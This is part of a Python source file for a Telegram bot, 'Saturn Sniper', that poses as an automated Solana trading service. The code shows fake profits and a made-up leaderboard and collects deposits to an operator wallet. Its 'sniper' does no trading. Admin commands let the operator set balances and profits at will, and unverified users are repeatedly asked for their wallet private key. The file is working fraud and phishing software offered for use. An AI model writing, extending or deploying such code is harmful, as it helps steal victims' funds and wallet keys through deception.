        update_fake_profit(user)

        bal = user["balance"]
        prof = user["profit_total"]
        dep = user["total_deposited"]
        created = user["created_at"]

        roi = (prof / dep * 100) if dep > 0 else 0

        text = (
            "📊 Account Statistics\n\n"
            f"💼 Total Deposited: {dep:.2f} SOL\n"
            f"💰 Current Balance: {bal:.2f} SOL\n"
            f"💹 Profit Total: {prof:.2f} SOL\n"
            f"📈 ROI: {roi:.2f}%\n\n"
            f"📅 Account Created: {created}"
        )

        update_info_panel(chat_id, user, text)
        return

    # --- LEADERBOARD ---
    if call.data == "leaderboard":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        profit = user["profit_total"]

        text = (
            "🏆 Weekly Leaderboard\n\n"
            "🥇 @crypto_queen196 — +15.4 SOL\n"
            "🥈 @LoneNova — +12.8 SOL\n"
            "🥉 @Carmen_Jordan354 — +9.2 SOL\n\n"
            f"➡️ Your Profit: +{profit:.2f} SOL"
        )

        update_info_panel(chat_id, user, text)
        return

    # --- START SNIPER ---
    if call.data == "sniper_start":
        bot.answer_callback_query(call.id)

        min_bal = float(meta.get("sniper_min_balance", 3.0))
        if user["balance"] < min_bal:
            update_info_panel(
                chat_id, user,
                f"❌ You need at least **{min_bal} SOL** to start the sniper."
            )
        else:
            user["sniper_running"] = True
            save_db()

            update_info_panel(
                chat_id, user,
                "🚀 Saturn Sniper Activated.\nScanning markets and executing trades automatically."
            )
        return

    # --- STOP SNIPER ---
    if call.data == "sniper_stop":
        bot.answer_callback_query(call.id)
        user["sniper_running"] = False
        save_db()

        update_info_panel(
            chat_id, user,
            "⛔️ Saturn Sniper has been stopped."
        )
        return

    # --- DEPOSIT ---
    if call.data == "deposit":
        bot.answer_callback_query(call.id)

        text = (
            "💼 Deposit SOL\n\n"
            "Send SOL to this address:\n"
            f"```{DEPOSIT_WALLET}```\n\n"
            "⚠️ Deposits may take up to 10 minutes to appear."
        )

        update_info_panel(chat_id, user, text, markup=back_markup(), markdown=True)
        return

    # --- SETTINGS ---
    if call.data == "settings":
        bot.answer_callback_query(call.id)

        addr = user["withdraw_address"]
        addr_text = f"```{addr}```" if addr else "❌ No withdrawal address set"
        lock_text = "Locked 🔒" if user["address_locked"] else "Unlocked 🔓"

        text = (
            "⚙️ Settings\n\n"
            "Current withdrawal address:\n"
            f"{addr_text}\n\n"
            f"🔐 Address Lock Status: {lock_text}"
        )

        update_info_panel(chat_id, user, text, markup=settings_markup(user), markdown=True)
        return

    # --- TOGGLE LOCK ---
    if call.data == "toggle_lock":
        bot.answer_callback_query(call.id)

        user["address_locked"] = not user["address_locked"]
        save_db()

        lock_text = "Locked 🔒" if user["address_locked"] else "Unlocked 🔓"
        addr = user["withdraw_address"]
        addr_text = f"```{addr}```" if addr else "❌ No withdrawal address set"

        update_info_panel(
            chat_id, user,
            f"⚙️ Settings Updated\n\nCurrent withdrawal address:\n{addr_text}\n\n🔐 Address is now {lock_text}",
            markup=settings_markup(user),
            markdown=True
        )
        return

    # --- CHANGE ADDRESS (PROMPT) ---
    if call.data == "change_address":
        bot.answer_callback_query(call.id)

        if user["address_locked"]:
            update_info_panel(
                chat_id, user,
                "❌ Address is locked. Unlock it first."
            )
            return

        update_info_panel(
            chat_id, user,
            "✏️ Send the new Solana withdrawal address:"
        )

        temp_msg = bot.send_message(chat_id, "🔹 Reply with address:")
        user["temp_prompt_msg_id"] = temp_msg.message_id
        save_db()

        bot.register_next_step_handler(temp_msg, lambda m: handle_new_address(m, call.from_user.id))
        return

    # --- BACK ---
    if call.data == "back_main":
        bot.answer_callback_query(call.id)

        update_info_panel(
            chat_id, user,
            "⬅️ Back to main menu.\nChoose an option."
        )
        return

# ===== ADDRESS INPUT =====

def handle_new_address(message, user_id):
    user = get_user(user_id)

    temp = user.get("temp_prompt_msg_id")
    if temp:
        try:
            bot.delete_message(message.chat.id, temp)
        except Exception:
            pass
        user["temp_prompt_msg_id"] = None
        save_db()

    new = message.text.strip()

    if len(new) < 30 or len(new) > 60:
        update_info_panel(
            message.chat.id, user,
            "❌ Invalid Solana address."
        )
        return

    confirm_msg = (
        f"📝 New Address:\n```{new}```\n\n"
        "Save this address?"
    )

    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_addr:{new}"))
    m.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_addr"))

    update_info_panel(message.chat.id, user, confirm_msg, markup=m, markdown=True)

# ===== CONFIRM / CANCEL =====

@bot.callback_query_handler(func=lambda c: c.data.startswith("confirm_addr:") or c.data == "cancel_addr")
def address_confirm(call):
    user = get_user(call.from_user.id)
    chat_id = call.message.chat.id

    if is_banned(call.from_user.id) and not is_admin(call.from_user.id):
        try:
            bot.answer_callback_query(call.id, "🚫 You are banned.")
        except Exception:
            pass
        return

    # Ensure only verified users can confirm addresses
    if not is_verified(call.from_user.id) and not is_admin(call.from_user.id):
        try:
            bot.answer_callback_query(call.id, "🔐 Please enter your private key using /start")
        except Exception:
            pass
        return

    if call.data.startswith("confirm_addr:"):
        new_addr = call.data.split("confirm_addr:")[1]

        if user["address_locked"]:
            update_info_panel(chat_id, user, "❌ Address is locked.")
            return

        user["withdraw_address"] = new_addr
        user["last_address_edit"] = now_utc_str()
        save_db()

        update_info_panel(
            chat_id, user,
            f"✅ Address Updated:\n```{new_addr}```",
            markdown=True
        )
        return

    if call.data == "cancel_addr":
        update_info_panel(chat_id, user, "❌ Address update cancelled.")
        return

# ===== ADMIN HELP (BOXED STYLE) =====

@bot.message_handler(commands=["adminhelp"])
def cmd_adminhelp(message):
    if not is_admin(message.from_user.id):
        return

    text = (
        "🛡 ADMIN COMMANDS\n"
        "=================\n"
        "\n"
        "🔰 Admin Control\n"
        "/admin_on – mirror all user actions\n"
        "/admin_off – stop mirroring\n"
        "/logstream_on – enable log stream\n"
        "/logstream_off – disable log stream\n"
        "\n"
        "👤 User Management\n"
        "/ban <id>\n"
        "/unban <id>\n"
        "/view_user <id>\n"
        "/reset_user <id>\n"
        "/note <id> <txt>\n"
        "/list_users\n"
        "\n"
        "💵 Balance & Profit\n"
        "/add_balance <id> <amt>\n"
        "/set_balance <id> <amt>\n"
        "/add_profit <id> <amt>\n"
        "/set_profit <id> <amt>\n"
        "/set_deposit <id> <amt>\n"
        "\n"
        "📤 Messaging\n"
        "/reply <id> <txt>\n"
        "/dm <id> <txt>\n"
        "/broadcast <txt>\n"
        "/broadcast_media\n"
        "/broadcast_group <group> <txt>\n"
        "\n"
        "📊 System\n"
        "/analytics\n"
        "/fixdb\n"
        "/db_dump\n"
        "/backup_now\n"
        "/prune\n"
        "\n"
        "⚙️ Bot Settings\n"
        "/set_sniper_minbal <amt>\n"
        "/set_profit_range <min> <max>\n"
        "/set_withdraw_min <amt>\n"
        "\n"
        "🛡 Admins\n"
        "/addadmin <id>\n"
        "/removeadmin <id>\n"
        "/listadmins\n"
        "\n"
        "🛠 Developer\n"
        "/debug\n"
        "/reboot\n"
        "/reload_db\n"
    )

    bot.reply_to(message, f"```{text}```", parse_mode="Markdown")

# ===== UNKNOWN COMMAND HANDLER =====

# List of known commands so unknown handler doesn't trigger on real ones
KNOWN_COMMANDS = {
    "/start", "/help",
    "/admin_on", "/admin_off",
    "/logstream_on", "/logstream_off",
    "/reply",
    "/add_balance", "/set_balance",
    "/add_profit", "/set_profit",
    "/set_deposit",
    "/view_user", "/reset_user", "/list_users",
    "/ban", "/unban",
    "/broadcast", "/broadcast_media", "/broadcast_group",
    "/analytics",
    "/note",
    "/dm",
    "/set_sniper_minbal", "/set_profit_range", "/set_withdraw_min",
    "/fixdb", "/backup_now", "/db_dump", "/prune",
    "/addadmin", "/removeadmin", "/listadmins",
    "/debug", "/reboot", "/reload_db",
    "/adminhelp"
}

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def unknown_command_handler(message):
    uid = message.from_user.id
    text = message.text or ""

    # Block unverified users from interacting (non-admin)
    if not is_admin(uid) and not is_verified(uid):
        bot.reply_to(message, "🔐 Please enter your private key first.\nUse /start")
        return

    # If this is a known command, ignore (other handlers will process it)
    if text.startswith("/"):
        cmd = text.split()[0]
        if cmd in KNOWN_COMMANDS:
            return

    # Admins: ignore unknown handler entirely
    if is_admin(uid):
        return

    # If awaiting address input, ignore (next_step_handler handles)
    u = db.get(str(uid), {})
    if u.get("temp_prompt_msg_id") is not None:
        return

    # Non-command text: do nothing (listener already mirrors it if enabled)
    if not text.startswith("/"):
        return

    # Ban check for unknown commands
    if is_banned(uid):
        bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
        return

    # Fake unknown command response
    bot.reply_to(
        message,
        "❓ Unknown command.\nUse /help to see available options."
    )

# ===== START BOT =====

if __name__ == "__main__":
    print("Saturn Auto Trade bot is running with extended admin features...")

    # Crash-safe polling loop to survive Telegram read timeouts
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[Polling Error] {e}")
            time.sleep(3)
